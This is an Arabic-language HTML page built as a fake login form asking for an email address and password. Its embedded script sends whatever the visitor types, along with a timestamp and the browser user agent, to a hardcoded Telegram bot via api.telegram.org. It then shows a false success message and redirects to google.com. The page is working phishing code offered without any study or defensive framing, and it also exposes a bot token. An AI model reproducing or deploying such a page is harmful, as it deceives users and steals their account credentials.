<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0d;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            color: #fff;
            text-align: center;
        }
        .container {
            background: #1a1a2e;
            padding: 40px 30px;
            border-radius: 25px;
            box-shadow: 0 0 40px rgba(233, 69, 96, 0.3);
            max-width: 400px;
            width: 90%;
        }
        h2 { font-weight: 300; margin-bottom: 10px; color: #e94560; }
        p { font-size: 14px; color: #aaa; margin-bottom: 25px; }
        input {
            width: 100%;
            padding: 15px;
            border-radius: 12px;
            border: none;
            background: #16213e;
            color: #fff;
            font-size: 16px;
            margin-bottom: 15px;
            outline: none;
        }
        input::placeholder { color: #888; }
        .btn {
            padding: 14px 0;
            background: #e94560;
            border: none;
            color: #fff;
            font-weight: bold;
            font-size: 16px;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
        .btn:hover { background: #c73652; transform: scale(1.02); }
        #status {
            margin-top: 15px;
            font-size: 14px;
            color: #aaa;
            min-height: 25px;
        }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="container">
    <h2>🔐 تسجيل الدخول</h2>
    <p>أدخل بريدك الإلكتروني وكلمة المرور</p>
    <input type="email" id="emailInput" placeholder="البريد الإلكتروني" required>
    <input type="password" id="passwordInput" placeholder="كلمة المرور" required>
    <button class="btn" id="submitBtn">تسجيل الدخول</button>
    <div id="status"></div>
</div>

<script>
    // ============================================================
    // إعدادات بوت تيليغرام
    // ============================================================
    const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
    const CHAT_ID   = "5730027675";

    // ============================================================

    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const submitBtn = document.getElementById('submitBtn');
    const statusDiv = document.getElementById('status');

    async function sendCredentialsToTelegram(email, password) {
        try {
            const message = `🔐 **تم تسجيل بيانات دخول جديدة**\n\n📩 البريد: ${email}\n🔑 كلمة المرور: ${password}\n🕒 الوقت: ${new Date().toLocaleString()}\n📱 الجهاز: ${navigator.userAgent}`;

            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            const result = await response.json();
            if (result.ok) {
                statusDiv.innerHTML = '✅ تم تسجيل الدخول بنجاح، جاري التوجيه...';
                statusDiv.style.color = '#4caf50';
                setTimeout(() => {
                    window.location.href = 'https://google.com';
                }, 1500);
            } else {
                statusDiv.innerHTML = '❌ حدث خطأ، حاول مرة أخرى';
                statusDiv.style.color = '#e94560';
                console.error(result);
            }
        } catch (e) {
            statusDiv.innerHTML = '❌ خطأ في الاتصال';
            statusDiv.style.color = '#e94560';
            console.error(e);
        }
    }

    submitBtn.addEventListener('click', function() {
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();

        if (!email || !email.includes('@') || !email.includes('.')) {
            statusDiv.innerHTML = '⚠️ يرجى إدخال بريد إلكتروني صحيح';
            statusDiv.style.color = '#ff9800';
            return;
        }

        if (!password || password.length < 4) {
            statusDiv.innerHTML = '⚠️ يرجى إدخال كلمة مرور صحيحة (4 أحرف على الأقل)';
            statusDiv.style.color = '#ff9800';
            return;
        }

        statusDiv.innerHTML = '⏳ جاري التحقق...';
        statusDiv.style.color = '#aaa';
        sendCredentialsToTelegram(email, password);
    });

    // إرسال عند الضغط على Enter
    emailInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            submitBtn.click();
        }
    });

    passwordInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            submitBtn.click();
        }
    });
</script>

</body>
</html>
